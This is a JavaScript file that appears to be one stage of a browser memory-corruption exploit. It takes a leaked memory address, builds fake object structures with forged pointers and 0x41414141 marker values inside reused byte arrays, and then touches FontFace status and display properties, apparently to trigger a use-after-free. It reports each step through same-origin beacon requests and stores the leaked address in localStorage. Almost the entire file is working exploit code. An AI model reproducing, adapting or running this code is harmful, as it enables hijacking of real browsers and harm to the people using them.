(function(){
function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m)+'?t='+Date.now(),false);x.send(null);}catch(e){}}
function hexQ(hi,lo){return('00000000'+hi.toString(16)).slice(-8)+('00000000'+lo.toString(16)).slice(-8);}
function wD(v,o,val){v[o]=val&0xFF;v[o+1]=(val>>>8)&0xFF;v[o+2]=(val>>>16)&0xFF;v[o+3]=(val>>>24)&0xFF;}
function wQ(v,o,hi,lo){v[o]=lo&0xFF;v[o+1]=(lo>>>8)&0xFF;v[o+2]=(lo>>>16)&0xFF;v[o+3]=(lo>>>24)&0xFF;v[o+4]=hi&0xFF;v[o+5]=(hi>>>8)&0xFF;v[o+6]=(hi>>>16)&0xFF;v[o+7]=(hi>>>24)&0xFF;}

var T=window.__T;
var m80=window.__m80;
if(!T||!m80){b('P579V-NO-DATA');return;}

var th=T[0],tl=T[1];
var l30=tl+0x30,h30=th;if(l30>=0x100000000){h30++;l30-=0x100000000;}
var lm=tl-0x10,hm=th;if(lm<0){hm--;lm+=0x100000000;}
var l20=tl+0x20,h20=th;if(l20>=0x100000000){h20++;l20-=0x100000000;}

function writeAll(mode){
  var kc=(mode==='control')?0:1;
  b('P579V-V102-'+mode+'-kc='+kc);
  for(var i=0;i<m80.length;i++){
    var v=m80[i];
    wD(v,0x00,kc);wD(v,0x04,1);wD(v,0x08,0);wD(v,0x0C,1);
    wQ(v,0x10,h30,l30);
    wD(v,0x28,0x42424242);
    wQ(v,0x30,hm,lm);
    wD(v,0x40,0x41414141);
    if(mode==='control'){wQ(v,0x48,0,0);}
    else{wQ(v,0x48,h20,l20);}
  }
  b('P579V-WRITTEN-'+mode);
}

function trigger(tag){
  var faces=window.__faces;
  if(!faces||!faces.length){b('P579V-NO-FACES');return;}
  b('P579V-'+tag+'-faces='+faces.length);
  for(var i=0;i<faces.length;i++){
    try{
      var st=faces[i].status;
      b('P579V-'+tag+'-f'+i+'-status='+st);
    }catch(e){b('P579V-'+tag+'-f'+i+'-status-err='+e.message);}
    try{
      faces[i].display='swap';
      b('P579V-'+tag+'-f'+i+'-display-set');
    }catch(e){b('P579V-'+tag+'-f'+i+'-display-err='+e.message);}
  }
}

writeAll('control');
trigger('CTRL');

setTimeout(function(){
  b('P579V-CTRL-SURVIVED');
  writeAll('test');
  trigger('TEST');
},2000);

setTimeout(function(){
  b('P579V-TEST-SURVIVED');
  b('P579V-RESULT-BOTH-SURVIVED');
  try{localStorage.setItem('p579',JSON.stringify({T:T,result:'both-survived'}));}catch(e){}
  document.body.innerHTML='<p>BOTH SURVIVED. T='+hexQ(th,tl)+'</p>';
},4000);
})();
